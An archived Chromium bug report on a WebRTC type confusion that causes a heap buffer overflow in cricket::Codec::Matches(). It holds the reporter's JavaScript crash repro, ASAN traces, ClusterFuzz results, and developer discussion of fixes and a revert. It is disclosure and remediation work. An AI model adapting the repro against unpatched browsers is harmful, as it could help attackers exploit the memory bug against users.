# Security:  WebRtc - Another Type Confusion in cricket::Codec::Matches()

| Field | Value |
|-------|-------|
| **Issue ID** | [40089279](https://issues.chromium.org/issues/40089279) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Unknown |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | zh...@chromium.org |
| **Created** | 2017-10-11 |
| **Bounty** | $1,000.00 |

## Description


VULNERABILITY DETAILS

	The fix for https://crbug.com/chromium/763842 can be bypassed.
	
	Steps to reproduce:
	
	1.Open PoC TypeConfusion_CodecMatches_Repro.html in Chrome browser ASAN build.
	2.ASAN reports a Heap Buffer Overflow in cricket::Codec::Matches().

		=================================================================
		==11480==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x26cc65a4 at pc 0x198723fb bp 0x22d9db8c sp 0x22d9db80
		READ of size 4 at 0x26cc65a4 thread T16

			#0 0x198723fa in cricket::Codec::Matches C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:107


VERSION
	Chrome Version: Chromium	63.0.3237.0 (Developer Build) (32-bit) 
	Operating System: Windows 10

REPRODUCTION CASE  (TypeConfusion_CodecMatches_Repro.html)
	<script>
	var context = new AudioContext();
	var rtcConfig = { "iceServers": [{ "urls": "stun:stun2.l.google.com:19302" },  ] };
	var options = {optional:[{DtlsSrtpKeyAgreement:false}, {RtpDataChannels: true}]};
	setInterval(function(){ pc2.createAnswer(function(answer) {pc2.setLocalDescription(new RTCSessionDescription(answer), function(){},function(){});}, function(){});}, 30);
	setInterval(function(){ pc2.createOffer(function(offer) {pc2.setRemoteDescription(new RTCSessionDescription(offer), function(){},function(e){}); }, function(e) {}); }, 30);
	var pc1 = new RTCPeerConnection(rtcConfig,options);
	var pc2 = new RTCPeerConnection(rtcConfig,options);
	setInterval(function(){ pc1.createOffer(function(offer) {pc2.setLocalDescription(new RTCSessionDescription(offer), function(){ pc1.createDataChannel("DataChanName0"); },function(e){});}, function(e) {});}, 20);
	try{ pc2.addStream(context.createMediaStreamDestination().stream);}catch(e){}
	setTimeout(function(){location.reload()},200);
	</script>


FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab
Crash State: 

	=================================================================
	==24136==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x07f70744 at pc 0x19714329 bp 0x227bd96c sp 0x227bd960
	READ of size 4 at 0x07f70744 thread T16

		#0 0x19714328 in cricket::Codec::Matches C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:105
		#1 0x19715464 in cricket::AudioCodec::Matches C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:186
		#2 0x1bd67121 in cricket::FindMatchingCodec<cricket::AudioCodec> C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\mediasession.cc:837
		#3 0x1bd5e95d in cricket::MediaSessionDescriptionFactory::AddAudioContentForAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\mediasession.cc:2103
		#4 0x1bd5cdae in cricket::MediaSessionDescriptionFactory::CreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\mediasession.cc:1499
		#5 0x19a0bd8b in webrtc::WebRtcSessionDescriptionFactory::InternalCreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsessiondescriptionfactory.cc:413
		#6 0x19a0b505 in webrtc::WebRtcSessionDescriptionFactory::CreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsessiondescriptionfactory.cc:301
		#7 0x19929ca6 in webrtc::PeerConnection::CreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\peerconnection.cc:906
		#8 0x198af94b in webrtc::MethodCall2<webrtc::PeerConnectionInterface,void,webrtc::CreateSessionDescriptionObserver *,const webrtc::PeerConnectionInterface::RTCOfferAnswerOptions &>::OnMessage C:\b\c\b\win_asan_release\src\third_party\webrtc\api\proxy.h:246
		#9 0x17a2fc85 in webrtc::internal::SynchronousMethodCall::OnMessage C:\b\c\b\win_asan_release\src\third_party\webrtc\api\proxy.h:141
		#10 0x19a56380 in jingle_glue::JingleThreadWrapper::Dispatch C:\b\c\b\win_asan_release\src\jingle\glue\thread_wrapper.cc:157
		#11 0x19a5775b in jingle_glue::JingleThreadWrapper::RunTask C:\b\c\b\win_asan_release\src\jingle\glue\thread_wrapper.cc:279
		#12 0x134e20e2 in base::internal::Invoker<base::internal::BindState<void (net::QuicChromiumClientSession::*)(unsigned int) __attribute__((thiscall)),base::WeakPtr<net::QuicChromiumClientSession>,unsigned int>,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:331
		#13 0x12c8133a in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:59
		#14 0x12d043b2 in base::internal::IncomingTaskQueue::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\incoming_task_queue.cc:143
		#15 0x12b9e595 in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:406
		#16 0x12b9f6b0 in base::MessageLoop::DeferOrRunPendingTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:417
		#17 0x12ba00a7 in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:524
		#18 0x12d0a853 in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:33
		#19 0x12b9d754 in base::MessageLoop::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:346
		#20 0x12c1dadd in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:123
		#21 0x12b98fba in base::Thread::Run C:\b\c\b\win_asan_release\src\base\threading\thread.cc:255
		#22 0x12b993d9 in base::Thread::ThreadMain C:\b\c\b\win_asan_release\src\base\threading\thread.cc:338
		#23 0x12b3d059 in base::`anonymous namespace'::ThreadFunc C:\b\c\b\win_asan_release\src\base\threading\platform_thread_win.cc:89
		#24 0x106e441 in __asan::AsanThread::ThreadStart e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_thread.cc:259
		#25 0x106d44d in asan_thread_start e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:136
		#26 0x75d462c3 in BaseThreadInitThunk+0x23 (C:\Windows\System32\KERNEL32.DLL+0x162c3)
		#27 0x772b0f68 in RtlSubscribeWnfStateChangeNotification+0x438 (C:\Windows\SYSTEM32\ntdll.dll+0x60f68)
		#28 0x772b0f33 in RtlSubscribeWnfStateChangeNotification+0x403 (C:\Windows\SYSTEM32\ntdll.dll+0x60f33)

	0x07f70744 is located 12 bytes to the right of 56-byte region [0x07f70700,0x07f70738)
	allocated by thread T0 here:
		#0 0x107462c in malloc e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:60
		#1 0x1ce44cab in operator new f:\dd\vctools\crt\vcstartup\src\heap\new_scalar.cpp:19
		#2 0x19908d6c in std::vector<cricket::DataCodec,std::allocator<cricket::DataCodec> >::_Reallocate c:\b\c\win_toolchain\vs_files\f53e4598951162bad6330f7a167486c7ae5db1e5\vc\include\vector:1601
		#3 0x19908ca4 in std::vector<cricket::DataCodec,std::allocator<cricket::DataCodec> >::_Reserve c:\b\c\win_toolchain\vs_files\f53e4598951162bad6330f7a167486c7ae5db1e5\vc\include\vector:1631
		#4 0x19908a29 in std::vector<cricket::DataCodec,std::allocator<cricket::DataCodec> >::push_back c:\b\c\win_toolchain\vs_files\f53e4598951162bad6330f7a167486c7ae5db1e5\vc\include\vector:1290
		#5 0x198ee57a in webrtc::ParseContent C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsdp.cc:2869
		#6 0x198d4e26 in webrtc::SdpDeserialize C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsdp.cc:863
		#7 0x198845db in webrtc::CreateSessionDescription C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\jsepsessiondescription.cc:123
		#8 0x17a2cbd2 in content::PeerConnectionDependencyFactory::CreateSessionDescription C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:437
		#9 0x178fa16e in content::RTCPeerConnectionHandler::CreateNativeSessionDescription C:\b\c\b\win_asan_release\src\content\renderer\media\rtc_peer_connection_handler.cc:2164
		#10 0x178f8fc0 in content::RTCPeerConnectionHandler::SetLocalDescription C:\b\c\b\win_asan_release\src\content\renderer\media\rtc_peer_connection_handler.cc:1398
		#11 0x1c85da07 in blink::RTCPeerConnection::setLocalDescription C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\peerconnection\RTCPeerConnection.cpp:697
		#12 0x1c3bcaec in blink::V8RTCPeerConnection::setLocalDescriptionMethodCallback C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\modules\v8\V8RTCPeerConnection.cpp:1493
		#13 0x105f025d in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:25
		#14 0x1084fd77 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:112
		#15 0x1084cba1 in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:142
		#16 0x1084c031 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:130

	Thread T16 created by T0 here:
		#0 0x106d532 in __asan_wrap_CreateThread e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:146
		#1 0x12b3c83c in base::PlatformThread::CreateWithPriority C:\b\c\b\win_asan_release\src\base\threading\platform_thread_win.cc:207
		#2 0x12b98689 in base::Thread::StartWithOptions C:\b\c\b\win_asan_release\src\base\threading\thread.cc:112
		#3 0x12b982b1 in base::Thread::Start C:\b\c\b\win_asan_release\src\base\threading\thread.cc:75
		#4 0x17a28a05 in content::PeerConnectionDependencyFactory::CreatePeerConnectionFactory C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:176
		#5 0x17a28719 in content::PeerConnectionDependencyFactory::GetPcFactory C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:135
		#6 0x17a2adf7 in content::PeerConnectionDependencyFactory::CreatePeerConnection C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:287
		#7 0x178f4032 in content::RTCPeerConnectionHandler::Initialize C:\b\c\b\win_asan_release\src\content\renderer\media\rtc_peer_connection_handler.cc:1251
		#8 0x1c85a1e0 in blink::RTCPeerConnection::RTCPeerConnection C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\peerconnection\RTCPeerConnection.cpp:523
		#9 0x1c85604e in blink::RTCPeerConnection::Create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\peerconnection\RTCPeerConnection.cpp:472
		#10 0x1c3c6766 in blink::V8RTCPeerConnection::constructorCallback C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\modules\v8\V8RTCPeerConnection.cpp:1635
		#11 0x105f025d in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:25
		#12 0x1084e30b in v8::internal::`anonymous namespace'::HandleApiCallHelper<1> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:112
		#13 0x1084cb4c in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:138
		#14 0x1084c031 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:130

	SUMMARY: AddressSanitizer: heap-buffer-overflow C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:105 in cricket::Codec::Matches
	Shadow bytes around the buggy address:
	  0x30fee090: 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee0a0: fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa
	  0x30fee0b0: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd
	  0x30fee0c0: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee0d0: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa
	=>0x30fee0e0: 00 00 00 00 00 00 00 fa[fa]fa fa fa fd fd fd fd
	  0x30fee0f0: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee100: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa
	  0x30fee110: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd
	  0x30fee120: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee130: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa
	Shadow byte legend (one shadow byte represents 8 application bytes):
	  Addressable:           00
	  Partially addressable: 01 02 03 04 05 06 07 
	  Heap left redzone:       fa
	  Freed heap region:       fd
	  Stack left redzone:      f1
	  Stack mid redzone:       f2
	  Stack right redzone:     f3
	  Stack after return:      f5
	  Stack use after scope:   f8
	  Global redzone:          f9
	  Global init order:       f6
	  Poisoned by user:        f7
	  Container overflow:      fc
	  Array cookie:            ac
	  Intra object redzone:    bb
	  ASan internal:           fe
	  Left alloca redzone:     ca
	  Right alloca redzone:    cb
	==24136==ABORTING





## Attachments

- [TypeConfusion_CodecMatches_Repro.html](attachments/TypeConfusion_CodecMatches_Repro.html) (text/plain, 1001 B)
- [TypeConfusion_CodecMatches_FullLog.txt](attachments/TypeConfusion_CodecMatches_FullLog.txt) (text/plain, 452.2 KB)
- [TypeConfusion_CodecMatches_FullLog2_webrtc.txt](attachments/TypeConfusion_CodecMatches_FullLog2_webrtc.txt) (text/plain, 2.7 MB)

## Timeline

### cl...@chromium.org (2017-10-12)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4787889476206592.

### wf...@chromium.org (2017-10-12)

CF can repro... full report is incoming. CCing some people early.

### de...@chromium.org (2017-10-13)

I can't figure out what could be going on. The JS code basically repeatedly gives pc2:

* A local data-only offer.
* A remote audio offer it creates itself.
* A local answer it creates itself.

The log indicates that when the error occurs, it's trying to create an audio answer while it has a data local description. The only way this could happen is if at one point previously, it had an audio remote offer... But then it should have been impossible to set the data local description in the first place, due to the fix that was added earlier.

I tried reproducing myself, but ran into this when trying to make an ASan build:

[14941/29396] ACTION //v8:run_mksnapshot(//build/toolchain/linux:clang_x64)
FAILED: gen/v8/snapshot.cc snapshot_blob.bin 
python ../../v8/tools/run.py ./mksnapshot --startup_src gen/v8/snapshot.cc --random-seed 314159265 --startup_blob snapshot_blob.bin
==40081==Shadow memory range interleaves with an existing memory mapping. ASan cannot proceed correctly. ABORTING.
==40081==ASan shadow was supposed to be located in the [0x00007fff7000-0x10007fff7fff] range.
==40081==This might be related to ELF_ET_DYN_BASE change in Linux 4.12.
==40081==See https://github.com/google/sanitizers/issues/837 for possible workarounds.

And clusterfuzz only includes warning-level logs, so it's not much help.

loobenyang, do you know anything more? If you can still reproduce this, can you collect verbose-level logs?

I did find this bug: https://bugs.chromium.org/p/webrtc/issues/detail?id=8389
But don't see how the test case above could trigger it.

Anyway: Until we find the root cause, I have a CL that will at least change RTC_DCHECKs to RTC_CHECKs, so that Chrome aborts before anything worse happens: https://webrtc-review.googlesource.com/c/src/+/9040

### lo...@gmail.com (2017-10-13)

Sure.
Just reproduced it in a Windows ASAN build with option "--log-level=0 --enable-logging=stderr" and attached the log.

Chromium	63.0.3227.0 (Developer Build) (32-bit)

### de...@chromium.org (2017-10-13)

Is it possible with "--enable-logging --vmodule=*/webrtc/*=1", to get INFO-level webrtc logs? Meanwhile I'll try fixing my ASan build issue...

### lo...@gmail.com (2017-10-13)

Sure, attached the log with option "--enable-logging=stder --vmodule=*/webrtc/*=1".

### zh...@chromium.org (2017-10-13)

I think I have something. Basically, the test case is doing following things:
SetRemoteDescription(audio offer) // OK
SetLocalDescription(audio answer)  // OK
SetLocalDescription(offer with no m= sections)  //odd, this shouldn't happen.
SetLocalDescription(data offer)  //odd
CreateAnswer() // crashed.  

Get audio option for the remote description but the current description is data only.
In this test case, the peerconnection actes as both caller and callee which is kind of odd.

### cl...@chromium.org (2017-10-13)

Detailed report: https://clusterfuzz.com/testcase?key=4787889476206592

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x60e0000b3b58
Crash State:
  cricket::AudioCodec::Matches
  bool cricket::FindMatchingCodec<cricket::AudioCodec>
  cricket::MediaSessionDescriptionFactory::AddAudioContentForAnswer
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=498412:498437

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4787889476206592

See https://github.com/google/clusterfuzz-tools for more information.

### sh...@chromium.org (2017-10-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-10-13)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-10-13)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/80cfb527c6e38267cdbf27ebce6a32595c80f21e

commit 80cfb527c6e38267cdbf27ebce6a32595c80f21e
Author: Taylor Brandstetter <deadbeef@webrtc.org>
Date: Fri Oct 13 16:36:28 2017

RTC_CHECK'ing content type before static_casting descriptions.

This will cause the application to be aborted before it encounters
something worse like a heap overflow, in case any bug in this code
exists or is introduced in the future.

TBR=zhihuang@webrtc.org

Bug: chromium:773620
Change-Id: Idd4e31aa63a3f673eefd3e8cb2ae3f4a5092ca4e
Reviewed-on: https://webrtc-review.googlesource.com/9040
Reviewed-by: Zhi Huang <zhihuang@webrtc.org>
Reviewed-by: Taylor Brandstetter <deadbeef@webrtc.org>
Commit-Queue: Taylor Brandstetter <deadbeef@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#20293}
[modify] https://crrev.com/80cfb527c6e38267cdbf27ebce6a32595c80f21e/pc/mediasession.cc


### ab...@chromium.org (2017-10-13)

can you please confirm if this requires a merge to M62?

### aw...@google.com (2017-10-13)

Unfortunate, but we can wait until M63 for this 

### de...@chromium.org (2017-10-13)

[Empty comment from Monorail migration]

### zh...@chromium.org (2017-10-13)

I have another fix(https://webrtc-review.googlesource.com/c/src/+/9621) for this. May want to merge both of them after that CL is submitted.

### bu...@chromium.org (2017-10-14)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/a8264dbdd97f5e125d45fd0e84356f2e1f747df1

commit a8264dbdd97f5e125d45fd0e84356f2e1f747df1
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Sat Oct 14 00:40:32 2017

Reject the subsequent offer with fewer m= sections.

If the subsequent offer contains fewer m= sections than the existing
description, it would be rejected.

The helper method MediaSectionsInSameOrder is modified and it will
compare the number of m= sections before matching the media type.

Bug: chromium:773620
Change-Id: Ic8999445f4bc023da1d85a65659583db1687ec37
Reviewed-on: https://webrtc-review.googlesource.com/9621
Reviewed-by: Taylor Brandstetter <deadbeef@webrtc.org>
Commit-Queue: Zhi Huang <zhihuang@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#20298}
[modify] https://crrev.com/a8264dbdd97f5e125d45fd0e84356f2e1f747df1/pc/peerconnectioninterface_unittest.cc
[modify] https://crrev.com/a8264dbdd97f5e125d45fd0e84356f2e1f747df1/pc/webrtcsession.cc


### sh...@chromium.org (2017-10-14)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-10-14)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-10-15)

Your change meets the bar and is auto-approved for M63. Please go ahead and merge the CL to branch 3239 manually. Please contact milestone owner if you have questions.
Owners: amineer@(Android), cmasso@(iOS), gkihumba@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-10-15)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-10-15)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/589ae45d0fa79e4d637bb21ce6bb0696f74db448

commit 589ae45d0fa79e4d637bb21ce6bb0696f74db448
Author: Tommi <tommi@webrtc.org>
Date: Sun Oct 15 21:50:06 2017

Revert "Reject the subsequent offer with fewer m= sections."

This reverts commit a8264dbdd97f5e125d45fd0e84356f2e1f747df1.

Reason for revert: Reverting to unblock rolls into Chromium.
See failure here:
https://build.chromium.org/p/tryserver.chromium.linux/builders/linux_chromium_rel_ng/builds/565449

Fails: external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-offer.html

I'm guessing these lines from the output are relevant:

12:15:32.525 11839   [1:19:1015/121532.495175:16438293900:ERROR:webrtcsession.cc(350)] Failed to set remote offer sdp: The order of m-lines in subsequent offer doesn't match order from previous offer/answer.
12:15:32.525 11839   [1:20:1015/121532.497199:16438296127:WARNING:delay_based_bwe.cc(326)] BWE Setting start bitrate to: 300000
12:15:32.525 11839   [1:1:1015/121532.498272:16438296963:ERROR:webrtcsdp.cc(359)] Failed to parse: "Invalid SDP". Reason: Expect line: v=
12:15:32.525 11839   [1:1:1015/121532.498364:16438297040:ERROR:rtc_peer_connection_handler.cc(2183)] Failed to create native session description. Type: offer SDP: Invalid SDP
12:15:32.525 11839   [1:1:1015/121532.498432:16438297104:ERROR:rtc_peer_connection_handler.cc(1458)] Failed to parse SessionDescription. Invalid SDP Expect line: v=

Original change's description:
> Reject the subsequent offer with fewer m= sections.
> 
> If the subsequent offer contains fewer m= sections than the existing
> description, it would be rejected.
> 
> The helper method MediaSectionsInSameOrder is modified and it will
> compare the number of m= sections before matching the media type.
> 
> Bug: chromium:773620
> Change-Id: Ic8999445f4bc023da1d85a65659583db1687ec37
> Reviewed-on: https://webrtc-review.googlesource.com/9621
> Reviewed-by: Taylor Brandstetter <deadbeef@webrtc.org>
> Commit-Queue: Zhi Huang <zhihuang@webrtc.org>
> Cr-Commit-Position: refs/heads/master@{#20298}

TBR=deadbeef@webrtc.org,zhihuang@webrtc.org

# Not skipping CQ checks because original CL landed > 1 day ago.

Bug: chromium:773620
Change-Id: I4a3ff7a42abb95144615b1dd37fb21585ee07b5d
Reviewed-on: https://webrtc-review.googlesource.com/10920
Reviewed-by: Tommi <tommi@webrtc.org>
Commit-Queue: Tommi <tommi@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#20300}
[modify] https://crrev.com/589ae45d0fa79e4d637bb21ce6bb0696f74db448/pc/peerconnectioninterface_unittest.cc
[modify] https://crrev.com/589ae45d0fa79e4d637bb21ce6bb0696f74db448/pc/webrtcsession.cc


### go...@chromium.org (2017-10-16)

** Bulk Edit **

Please merge your change to M63 branch 3239 before 5:00 PM PT Monday (10/16) so we can take it in for next dev release. Thank you.

### cl...@chromium.org (2017-10-16)

ClusterFuzz has detected this issue as fixed in range 508970:508976.

Detailed report: https://clusterfuzz.com/testcase?key=4787889476206592

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x60e0000b3b58
Crash State:
  cricket::AudioCodec::Matches
  bool cricket::FindMatchingCodec<cricket::AudioCodec>
  cricket::MediaSessionDescriptionFactory::AddAudioContentForAnswer
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=498412:498437
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=508970:508976

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4787889476206592

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-10-16)

ClusterFuzz testcase 4787889476206592 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### aw...@google.com (2017-10-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-10-16)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/c608c1e6151524be12f34a34bbc30c208a306ee3

commit c608c1e6151524be12f34a34bbc30c208a306ee3
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Mon Oct 16 20:18:09 2017

Merge to M63:RTC_CHECK'ing content type before static_casting descriptions.

This will cause the application to be aborted before it encounters
something worse like a heap overflow, in case any bug in this code
exists or is introduced in the future.

Bug: chromium:773620
Change-Id: I2ffa8cd09a6526735cfac62a39eff9ae4487421d
Reviewed-on: https://webrtc-review.googlesource.com/11541
Reviewed-by: Taylor Brandstetter <deadbeef@webrtc.org>
Cr-Commit-Position: refs/branch-heads/63@{#2}
Cr-Branched-From: bef8a5d2ca5413c680995584b8c0976852ba5f25-refs/heads/master@{#20237}
[modify] https://crrev.com/c608c1e6151524be12f34a34bbc30c208a306ee3/pc/mediasession.cc


### lo...@gmail.com (2017-10-16)

So the only fix we have is to crash it?
Good to get rid of the security risk.
However, it's still not a good image for the product's stability and reliability.

### zh...@chromium.org (2017-10-16)

Not really. Crashing it is a more generic fix to prevent something like to happen in the future.

https://webrtc-review.googlesource.com/9621 is a more specific fix but I haven't got a chance to merge it since something else is blocking it.

### go...@chromium.org (2017-10-16)

Per https://crbug.com/chromium/773620#c63, change is already merged to M63. If nothing is pending for M63, please remove "Merge-Approved-63" label. Thank you.

### zh...@chromium.org (2017-10-16)

I also want to merge this (https://webrtc-review.googlesource.com/9621) but right now it is blocked by something else.

As I commented in 28, the merged fix is a generic one by making the application to be aborted which is not ideal. This (https://webrtc-review.googlesource.com/9621) fix is a more specific one for this case.

### de...@chromium.org (2017-10-17)

[Empty comment from Monorail migration]

### go...@chromium.org (2017-10-17)

+awhalley@ PTAL https://crbug.com/chromium/773620#c30.

### aw...@google.com (2017-10-17)

Thanks zhihuang@. I'm OK moving this to block Stable, rather than Beta, which should also give time to take the second change.

### sh...@chromium.org (2017-10-18)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### de...@chromium.org (2017-10-18)

[Empty comment from Monorail migration]

### de...@chromium.org (2017-10-18)

[Empty comment from Monorail migration]

### de...@chromium.org (2017-10-18)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-10-19)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-10-20)

Hi loobenyang@ - the VRP panel decided to reward $1,000 for this report - thanks!

### aw...@chromium.org (2017-10-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2017-10-20)

[Empty comment from Monorail migration]

### de...@chromium.org (2017-10-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2017-10-21)

ClusterFuzz testcase 4538181419794432 is still reproducing on tip-of-tree build (trunk).

Please re-test your fix against this testcase and if the fix was incorrect or incomplete, please re-open the bug. Otherwise, ignore this notification and add ClusterFuzz-Wrong label.

### cl...@chromium.org (2017-10-22)

ClusterFuzz has detected this issue as fixed in range 508970:508976.

Detailed report: https://clusterfuzz.com/testcase?key=4787889476206592

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x60e0000b3b58
Crash State:
  cricket::AudioCodec::Matches
  bool cricket::FindMatchingCodec<cricket::AudioCodec>
  cricket::MediaSessionDescriptionFactory::AddAudioContentForAnswer
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=498412:498437
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=508970:508976

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4787889476206592

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### sh...@chromium.org (2017-10-23)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2017-10-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e3dc12451acb5ce3397fdf6506607145c4ee681f

